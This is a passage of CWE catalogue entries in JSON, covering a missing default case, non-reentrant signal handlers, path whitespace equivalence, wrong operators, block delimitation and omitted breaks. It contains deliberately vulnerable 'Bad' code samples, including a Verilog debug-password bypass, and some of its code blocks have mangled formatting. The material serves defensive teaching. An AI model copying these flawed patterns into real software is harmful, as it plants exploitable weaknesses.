\n\t\t\tprint(\"Properly handle zero case.\")\n\t\tcase 1: \n\t\t\tprint(\"Properly handle one case.\")\n\t\tcase _: \n\t\t\tprint(\"Properly handle unexpected condition.\")\n\t# program execution continues...\n```"}]}, {"Entries": [{"IntroText": "In the following JavaScript example the switch-case statements (available in JavaScript version 1.2 and later) are used to process a given step based on the result of a calcuation involving two inputs. The expected return is either 1, 2, or 3. However, if an unexpected result (e.g., 4) is obtained then no action will be taken potentially leading to an unexpected program state."}, {"Nature": "Bad", "Language": "JavaScript", "ExampleCode": "```\n\tlet step = input1 + input2; \n\tswitch(step) { \n\t\tcase 1: \n\t\t\talert(\"Process step 1.\"); \n\t\t\tbreak;\n\t\tcase 2: \n\t\t\talert(\"Process step 2.\"); \n\t\t\tbreak;\n\t\tcase 3: \n\t\t\talert(\"Process step 3.\"); \n\t\t\tbreak;\n\t} \n\t// program execution continues...\n```"}, {"BodyText": "The recommended approach is to add a default case that captures any unexpected result conditions and properly handles them."}, {"Nature": "Good", "Language": "JavaScript", "ExampleCode": "```\n\tlet step = input1 + input2; \n\tswitch(step) { \n\t\tcase 1: \n\t\t\talert(\"Process step 1.\"); \n\t\t\tbreak;\n\t\tcase 2: \n\t\t\talert(\"Process step 2.\"); \n\t\t\tbreak;\n\t\tcase 3: \n\t\t\talert(\"Process step 3.\"); \n\t\t\tbreak;\n\t\tdefault: \n\t\t\talert(\"Unexpected step encountered.\");\n\t} \n\t// program execution continues...\n```"}]}, {"ID": "DX-152", "Entries": [{"IntroText": "The Finite State Machine (FSM) shown in the \"bad\" code snippet below assigns the output (\"out\") based on the value of state, which is determined based on the user provided input (\"user_input\")."}, {"Nature": "Bad", "Language": "Verilog", "ExampleCode": "```\n\tmodule fsm_1(out, user_input, clk, rst_n); \n\tinput [2:0] user_input; \n\tinput clk, rst_n; \n\toutput reg [2:0] out; \n\treg [1:0] state; \n\talways @ (posedge clk or negedge rst_n ) \n\t\tbegin \n\t\t\t if (!rst_n)\n\t\t\t\t state = 3'h0; \n\t\t\t else\n\t\t\t case (user_input) \n\t\t\t\t 3'h0:\n\t\t\t\t 3'h1:\n\t\t\t\t 3'h2:\n\t\t\t\t 3'h3: state = 2'h3;\n\t\t\t\t 3'h4: state = 2'h2;\n\t\t\t\t 3'h5: state = 2'h1;\n\t\t\t endcase \n\t\t end\n\t\t out <= {1'h1, state};\n\t endmodule \n```"}, {"BodyText": "The case statement does not include a default to handle the scenario when the user provides inputs of 3'h6 and 3'h7. Those inputs push the system to an undefined state and might cause a crash (denial of service) or any other unanticipated outcome.\n\n\nAdding a default statement to handle undefined inputs mitigates this issue. This is shown in the \"Good\" code snippet below. The default statement is in bold."}, {"Nature": "Good", "Language": "Verilog", "ExampleCode": "```\n\tcase (user_input) \n\t\t3'h0: \n\t\t3'h1: \n\t\t3'h2: \n\t\t3'h3: state = 2'h3; \n\t\t3'h4: state = 2'h2; \n\t\t3'h5: state = 2'h1; \n```\ndefault: state = 2'h0;**  endcase"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "479", "Name": "Signal Handler Use of a Non-reentrant Function", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product defines a signal handler that calls a non-reentrant function.", "ExtendedDescription": "\n\nNon-reentrant functions are functions that cannot safely be called, interrupted, and then recalled before the first call has finished without resulting in memory corruption. This can lead to an unexpected system state and unpredictable results with a variety of potential consequences depending on context, including denial of service and code execution.\n\n\nMany functions are not reentrant, but some of them can result in the corruption of memory if they are used in a signal handler. The function call syslog() is an example of this. In order to perform its functionality, it allocates a small amount of memory as \"scratch space.\" If syslog() is suspended by a signal call and the signal handler calls syslog(), the memory used by both of these functions enters an undefined, and possibly, exploitable state. Implementations of malloc() and free() manage metadata in global structures in order to track which memory is allocated versus which memory is available, but they are non-reentrant. Simultaneous calls to these functions can cause corruption of the metadata.\n", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "828", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "663", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "123", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "It may be possible to execute arbitrary code through the use of a write-what-where condition."}, {"Scope": ["Integrity"], "Impact": ["Modify Memory", "Modify Application Data"], "Note": "Signal race conditions often result in data corruption."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Requirements"], "Description": "Require languages or libraries that provide reentrant functionality, or otherwise make it easier to avoid this weakness."}, {"Phase": ["Architecture and Design"], "Description": "Design signal handlers to only set flags rather than perform complex functionality."}, {"Phase": ["Implementation"], "Description": "Ensure that non-reentrant functions are not found in signal handlers."}, {"Phase": ["Implementation"], "Description": "Use sanity checks to reduce the timing window for exploitation of race conditions. This is only a partial solution, since many attacks might fail, but other attacks still might work within the narrower window, even accidentally.", "Effectiveness": "Defense in Depth"}], "DemonstrativeExamples": [{"ID": "DX-171", "Entries": [{"IntroText": "In this example, a signal handler uses syslog() to log a message:"}, {"Nature": "Bad", "ExampleCode": "```\n\tchar *message;\n\tvoid sh(int dummy) {\n\t\tsyslog(LOG_NOTICE,\"%s\\n\",message);\n\t\tsleep(10);\n\t\texit(0);\n\t}\n\tint main(int argc,char* argv[]) {\n\t\t...\n\t\tsignal(SIGHUP,sh);\n\t\tsignal(SIGTERM,sh);\n\t\tsleep(10);\n\t\texit(0);\n\t}\n\t\tIf the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state.\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2005-0893", "Description": "signal handler calls function that ultimately uses malloc()", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0893"}, {"Reference": "CVE-2004-2259", "Description": "SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2259"}], "AffectedResources": ["System Process"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "48", "Name": "Path Equivalence: 'file name' (Internal Whitespace)", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of internal space ('file(SPACE)name') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "ObservedExamples": [{"Reference": "CVE-2000-0293", "Description": "Filenames with spaces allow arbitrary file deletion when the product does not properly quote them; some overlap with path traversal.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0293"}, {"Reference": "CVE-2001-1567", "Description": "\"+\" characters in query string converted to spaces before sensitive file/extension (internal space), leading to bypass of access restrictions to the file.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1567"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "This weakness is likely to overlap quoting problems, e.g. the \"Program Files\" unquoted search path (CWE-428). It also could be an equivalence issue if filtering removes all extraneous spaces."}, {"Type": "Relationship", "Note": "Whitespace can be a factor in other weaknesses not directly related to equivalence. It can also be used to spoof icons or hide files with dangerous names (see icon manipulation and visual truncation in CWE-451)."}]}
{"ID": "480", "Name": "Use of Incorrect Operator", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product accidentally uses the wrong operator, which changes the logic in security-relevant ways.", "ExtendedDescription": "These types of errors are generally the result of a typo by the programmer.", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "670", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Sometimes"}, {"Type": "Language", "Name": "C++", "Prevalence": "Sometimes"}, {"Type": "Language", "Name": "Perl", "Prevalence": "Sometimes"}, {"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Alter Execution Logic"], "Note": "This weakness can cause unintended logic to be executed and other unexpected application behavior."}], "DetectionMethods": [{"Method": "Automated Static Analysis", "Description": "This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program."}, {"Method": "Manual Static Analysis", "Description": "This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program."}], "DemonstrativeExamples": [{"ID": "DX-140", "Entries": [{"IntroText": "The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint isValid(int value) {\n\t\tif (value=100) {\n\t\t\tprintf(\"Value is valid\\n\");\n\t\t\treturn(1);\n\t\t}\n\t\tprintf(\"Value is not valid\\n\");\n\t\treturn(0);\n\t}\n```"}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\tbool isValid(int value) {\n\t\tif (value=100) {\n\t\t\tConsole.WriteLine(\"Value is valid.\");\n\t\t\treturn true;\n\t\t}\n\t\tConsole.WriteLine(\"Value is not valid.\");\n\t\treturn false;\n\t}\n```"}, {"BodyText": "However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results."}]}, {"ID": "DX-103", "Entries": [{"IntroText": "The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#define SIZE 50\n\tint *tos, *p1, stack[SIZE];\n\tvoid push(int i) {\n\t\t\tp1++;\n\t\t\tif(p1==(tos+SIZE)) {\n```\n// Print stack overflow error message and exit* \n\t\t\t\t\t}\n\t\t\t*p1 == i;}\n\t\n\tint pop(void) {\n\t```\n\t\t\tif(p1==tos) {\n```\n// Print stack underflow error message and exit* \n\t\t\t\t\t}\n\t\t\tp1--;\n\t\t\treturn *(p1+1);}\n\t\n\tint main(int argc, char *argv[]) {\n\t```\n```\n// initialize tos and p1 to point to the top of stack* \n\t\t\ttos = stack;\n\t\t\tp1 = stack;\n\t\t\t\n\t\t\t *// code to add and remove items from stack* \n\t\t\t...\n\t\t\treturn 0;}"}, {"BodyText": "The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable."}, {"BodyText": "However, this expression uses the comparison operator \"==\" rather than the assignment operator \"=\". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results."}]}, {"Entries": [{"IntroText": "The example code below is taken from the CVA6 processor core of the HACK@DAC'21 buggy OpenPiton SoC. Debug access allows users to access internal hardware registers that are otherwise not exposed for user access or restricted access through access control protocols. Hence, requests to enter debug mode are checked and authorized only if the processor has sufficient privileges. In addition, debug accesses are also locked behind password checkers. Thus, the processor enters debug mode only when the privilege level requirement is met, and the correct debug password is provided."}, {"BodyText": "The following code [REF-1377] illustrates an instance of a vulnerable implementation of debug mode. The core correctly checks if the debug requests have sufficient privileges and enables the debug_mode_d and debug_mode_q signals. It also correctly checks for debug password and enables umode_i signal."}, {"Nature": "Bad", "Language": "Verilog", "ExampleCode": "module csr_regfile #(\n ...\n\n```\n\t // check that we actually want to enter debug depending on the privilege level we are currently in\n\t unique case (priv_lvl_o)\n\t\t riscv::PRIV_LVL_M: begin\n\t\t\t debug_mode_d = dcsr_q.ebreakm;\n ...\n\t\t riscv::PRIV_LVL_U: begin\n\t\t\t debug_mode_d = dcsr_q.ebreaku;\n ...\n```\nassign priv_lvl_o = (debug_mode_q || umode_i) ? riscv::PRIV_LVL_M : priv_lvl_q;** \n\t ...\n\n```\n\t debug_mode_q <= debug_mode_d;\n ...\n```"}, {"BodyText": "However, it grants debug access and changes the privilege level, priv_lvl_o, even when one of the two checks is satisfied and the other is not. Because of this, debug access can be granted by simply requesting with sufficient privileges (i.e., debug_mode_q is enabled) and failing the password check (i.e., umode_i is disabled). This allows an attacker to bypass the debug password checking and gain debug access to the core, compromising the security of the processor."}, {"BodyText": "A fix to this issue is to only change the privilege level of the processor when both checks are satisfied, i.e., the request has enough privileges (i.e., debug_mode_q is enabled) and the password checking is successful (i.e., umode_i is enabled) [REF-1378]."}, {"Nature": "Good", "Language": "Verilog", "ExampleCode": "module csr_regfile #(\n ...\n\n```\n\t // check that we actually want to enter debug depending on the privilege level we are currently in\n\t unique case (priv_lvl_o)\n\t\t riscv::PRIV_LVL_M: begin\n\t\t\t debug_mode_d = dcsr_q.ebreakm;\n ...\n\t\t riscv::PRIV_LVL_U: begin\n\t\t\t debug_mode_d = dcsr_q.ebreaku;\n ...\n\t assign priv_lvl_o = \n```\n(debug_mode_q && umode_i) ? riscv::PRIV_LVL_M : priv_lvl_q;** \n\t ...\n\n```\n\t debug_mode_q <= debug_mode_d;\n ...\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2022-3979", "Description": "Chain: data visualization program written in PHP uses the \"!=\" operator instead of the type-strict \"!==\" operator (CWE-480) when validating hash values, potentially leading to an incorrect type conversion (CWE-704)", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3979"}, {"Reference": "CVE-2021-3116", "Description": "Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-3116"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-32648", "Description": "octobercms in a CMS platform based on the Laravel PHP Framework. In affected versions of the october/system package an attacker can request an account password reset and then gain access to the account using a specially crafted request. The issue has been patched in Build 472 and v1.1.5."}]}
{"ID": "481", "Name": "Assigning instead of Comparing", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The code uses an operator for assignment when the intention was to perform a comparison.", "ExtendedDescription": "In many languages the compare statement is very close in appearance to the assignment statement and are often confused. This bug is generally the result of a typo and usually causes obvious problems with program execution. If the comparison is in an if statement, the if statement will usually evaluate the value of the right-hand side of the predicate.", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "480", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "697", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Alter Execution Logic"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Many IDEs and static analysis products will detect this problem."}, {"Phase": ["Implementation"], "Description": "Place constants on the left. If one attempts to assign a constant with a variable, the compiler will produce an error."}], "DemonstrativeExamples": [{"ID": "DX-140", "Entries": [{"IntroText": "The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint isValid(int value) {\n\t\tif (value=100) {\n\t\t\tprintf(\"Value is valid\\n\");\n\t\t\treturn(1);\n\t\t}\n\t\tprintf(\"Value is not valid\\n\");\n\t\treturn(0);\n\t}\n```"}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\tbool isValid(int value) {\n\t\tif (value=100) {\n\t\t\tConsole.WriteLine(\"Value is valid.\");\n\t\t\treturn true;\n\t\t}\n\t\tConsole.WriteLine(\"Value is not valid.\");\n\t\treturn false;\n\t}\n```"}, {"BodyText": "However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results."}]}, {"Entries": [{"IntroText": "In this example, we show how assigning instead of comparing can impact code when values are being passed by reference instead of by value. Consider a scenario in which a string is being processed from user input. Assume the string has already been formatted such that different user inputs are concatenated with the colon character. When the processString function is called, the test for the colon character will result in an insertion of the colon character instead, adding new input separators. Since the string was passed by reference, the data sentinels will be inserted in the original string (CWE-464), and further processing of the inputs will be altered, possibly malformed.."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tvoid processString (char *str) {\n\t\t\tint i;\n\t\t\tfor(i=0; i<strlen(str); i++) {\n\t\t\t\tif (isalnum(str[i])){\n\t\t\t\t\tprocessChar(str[i]);\n\t\t\t\t}\n\t\t\t\telse if (str[i] = ':') {\n\t\t\t\t\tmovingToNewInput();}\n\t\t\t\t}\n\t\t\t}\n\t}\n```"}]}, {"Entries": [{"IntroText": "The following Java example attempts to perform some processing based on the boolean value of the input parameter. However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". As with the previous examples, the variable will be reassigned locally and the expression in the if statement will evaluate to true and unintended processing may occur."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic void checkValid(boolean isValid) {\n\t\tif (isValid = true) {\n\t\t\tSystem.out.println(\"Performing processing\");\n\t\t\tdoSomethingImportant();\n\t\t}\n\t\telse {\n\t\t\tSystem.out.println(\"Not Valid, do not perform processing\");\n\t\t\treturn;\n\t\t}\n\t}\n```"}, {"BodyText": "While most Java compilers will catch the use of an assignment operator when a comparison operator is required, for boolean variables in Java the use of the assignment operator within an expression is allowed. If possible, try to avoid using comparison operators on boolean variables in java. Instead, let the values of the variables stand for themselves, as in the following code."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic void checkValid(boolean isValid) {\n\t\tif (isValid) {\n\t\t\tSystem.out.println(\"Performing processing\");\n\t\t\tdoSomethingImportant();\n\t\t}\n\t\telse {\n\t\t\tSystem.out.println(\"Not Valid, do not perform processing\");\n\t\t\treturn;\n\t\t}\n\t}\n```"}, {"BodyText": "Alternatively, to test for false, just use the boolean NOT operator."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic void checkValid(boolean isValid) {\n\t\tif (!isValid) {\n\t\t\tSystem.out.println(\"Not Valid, do not perform processing\");\n\t\t\treturn;\n\t\t}\n\t\tSystem.out.println(\"Performing processing\");\n\t\tdoSomethingImportant();\n\t}\n```"}]}, {"Entries": [{"IntroText": "The following example demonstrates the weakness."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tvoid called(int foo){\n\t\tif (foo=1) printf(\"foo\\n\");\n\t}\n\tint main() {\n\t\t\tcalled(2);\n\t\t\treturn 0;\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "482", "Name": "Comparing instead of Assigning", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The code uses an operator for comparison when the intention was to perform an assignment.", "ExtendedDescription": "In many languages, the compare statement is very close in appearance to the assignment statement; they are often confused.", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "480", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "This bug primarily originates from a typo."}], "CommonConsequences": [{"Scope": ["Availability", "Integrity"], "Impact": ["Unexpected State"], "Note": "The assignment will not take place, which should cause obvious program execution problems."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Many IDEs and static analysis products will detect this problem."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following example demonstrates the weakness."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tvoid called(int foo) {\n\t\tfoo==1;\n\t\tif (foo==1) System.out.println(\"foo\\n\");\n\t}\n\tint main() {\n\t\t\tcalled(2);\n\t\t\treturn 0;\n\t}\n```"}]}, {"ID": "DX-103", "Entries": [{"IntroText": "The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#define SIZE 50\n\tint *tos, *p1, stack[SIZE];\n\tvoid push(int i) {\n\t\t\tp1++;\n\t\t\tif(p1==(tos+SIZE)) {\n```\n// Print stack overflow error message and exit* \n\t\t\t\t\t}\n\t\t\t*p1 == i;}\n\t\n\tint pop(void) {\n\t```\n\t\t\tif(p1==tos) {\n```\n// Print stack underflow error message and exit* \n\t\t\t\t\t}\n\t\t\tp1--;\n\t\t\treturn *(p1+1);}\n\t\n\tint main(int argc, char *argv[]) {\n\t```\n```\n// initialize tos and p1 to point to the top of stack* \n\t\t\ttos = stack;\n\t\t\tp1 = stack;\n\t\t\t\n\t\t\t *// code to add and remove items from stack* \n\t\t\t...\n\t\t\treturn 0;}"}, {"BodyText": "The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable."}, {"BodyText": "However, this expression uses the comparison operator \"==\" rather than the assignment operator \"=\". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "483", "Name": "Incorrect Block Delimitation", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.", "ExtendedDescription": "In some languages, braces (or other delimiters) are optional for blocks. When the delimiter is omitted, it is possible to insert a logic error in which a statement is thought to be in a block but is not. In some cases, the logic error can have security implications.", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "670", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}, {"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Sometimes"}, {"Type": "Language", "Name": "C++", "Prevalence": "Sometimes"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Alter Execution Logic"], "Note": "This is a general logic error which will often lead to obviously-incorrect behaviors that are quickly noticed and fixed. In lightly tested or untested code, this error may be introduced it into a production environment and provide additional attack vectors by creating a control flow path leading to an unexpected state in the application. The consequences will depend on the types of behaviors that are being incorrectly executed."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Always use explicit block delimitation and use static-analysis technologies to enforce this practice."}], "DemonstrativeExamples": [{"ID": "DX-181", "Entries": [{"IntroText": "In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tif (condition==true)\n\t\tDo_X();\n\t\tDo_Y();\n```"}, {"BodyText": "This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."}]}, {"Entries": [{"IntroText": "In this example, the programmer has indented the Do_Y() statement as if the intention is that the function should be associated with the preceding conditional and should only be called when the condition is true. However, because Do_X() was called on the same line as the conditional and there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tif (condition==true) Do_X();\n\t\tDo_Y();\n```"}, {"BodyText": "This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."}]}], "ObservedExamples": [{"Reference": "CVE-2014-1266", "Description": "incorrect indentation of \"goto\" statement makes it more difficult to detect an incorrect goto (Apple's \"goto fail\")", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "484", "Name": "Omitted Break Statement in Switch", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.", "ExtendedDescription": "This can lead to critical code executing in situations where it should not.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "670", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}, {"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Alter Execution Logic"], "Note": "This weakness can cause unintended logic to be executed and other unexpected application behavior."}], "DetectionMethods": [{"Method": "White Box", "Description": "Omission of a break statement might be intentional, in order to support fallthrough. Automated detection methods might therefore be erroneous. Semantic understanding of expected product behavior is required to interpret whether the code is correct."}, {"Method": "Black Box", "Description": "Since this weakness is associated with a code construct, it would be indistinguishable from other errors that produce the same behavior."}, 